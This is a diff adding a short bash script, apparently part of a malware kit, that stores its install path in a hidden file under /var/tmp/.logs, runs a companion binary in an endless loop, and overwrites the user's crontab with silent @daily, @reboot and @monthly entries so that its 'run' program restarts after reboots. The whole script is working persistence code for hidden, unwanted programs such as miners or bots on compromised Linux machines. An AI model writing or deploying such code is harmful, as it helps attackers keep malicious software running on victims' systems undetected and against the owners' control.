@@ -1,0 +1,41 @@
+#!/bin/bash
+#made by Maz4id#1363
+if [ $# != 1 ]; then
+        echo " usage: $0 > /dev/null 2>&1 & disown"
+fi
+
+locatie=$(cat /var/tmp/.logs/.local)
+if [ -f /var/tmp/.logs/.local ]; then
+	:
+else
+	if [ -d /var/tmp/.logs ]; then
+		echo $(pwd) > /var/tmp/.logs/.local
+	else
+		mkdir /var/tmp/.logs
+		echo $(pwd) > /var/tmp/.logs/.local
+	fi
+fi
+
+crontabcalumea() {
+	if ! crontab -l | grep -q 'run'; then
+		rm -rf $(cat /var/tmp/.logs/.local)/.tempo
+		echo "@daily $(cat /var/tmp/.logs/.local)/1" >> $(cat /var/tmp/.logs/.local)/.tempo
+		sleep 1
+		echo "@reboot $(cat /var/tmp/.logs/.local)/run > /dev/null 2>&1 & disown" >> $(cat /var/tmp/.logs/.local)/.tempo
+		sleep 1
+		echo "@monthly $(cat /var/tmp/.logs/.local)/run  > /dev/null 2>&1 & disown" >> $(cat /var/tmp/.logs/.local)/.tempo
+		sleep 1
+		crontab $(cat /var/tmp/.logs/.local)/.tempo
+		sleep 1
+		rm -rf $(cat /var/tmp/.logs/.local)/.tempo
+	fi
+}
+
+
+sleep 5
+while :
+do
+$(cat /var/tmp/.logs/.local)/1
+crontabcalumea
+sleep 5
+done
